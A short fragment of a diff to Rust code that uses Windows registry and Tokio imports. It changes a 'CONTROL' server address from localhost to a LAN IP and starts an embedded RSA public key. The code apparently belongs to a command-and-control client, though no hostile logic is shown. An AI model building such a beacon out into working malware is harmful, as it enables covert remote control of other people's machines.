@@ -14,7 +14,7 @@ use tokio::time::{sleep, Duration};
 use winreg::enums::*;
 use winreg::RegKey;
 
-const CONTROL: &str = "127.0.0.1:8080";
+const CONTROL: &str = "192.168.1.154:8080";
 const RSA_PUB_PEM: &str = "-----BEGIN RSA PUBLIC KEY-----
 MIIBCgKCAQEA1KBXWBk/GxsfTWhKTSUp7SB/M+cE9vQHVYaeRgtzN4t430JbmUbU
 3bMVusTc5FzE659d7JFpFmEV1jQuuscwarBtG4LTsgRzm/WntGlXLXqCLlr/lka0
